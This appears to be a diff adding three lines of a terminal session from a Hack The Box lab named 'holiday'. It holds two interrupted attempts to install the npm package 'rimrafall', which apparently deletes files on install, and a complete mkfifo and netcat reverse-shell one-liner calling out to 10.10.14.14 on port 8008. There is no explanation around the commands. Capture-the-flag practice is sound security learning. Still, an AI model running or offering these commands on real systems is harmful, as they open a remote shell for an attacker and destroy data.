@@ -1,0 +1,3 @@
+root@parrot:~/hackthebox/holiday# ^Cdo npm i rimrafall --unsafe             
+root@parrot:~/hackthebox/holiday# sudo npm i rimrafall --unsafe  ^C         
+root@parrot:~/hackthebox/holiday# rm /tmp/b0;mkfifo /tmp/b;cat /tmp/b|/bin/sh -i 2>&1|nc 10.10.14.14 8008 >/tmp/b                                       
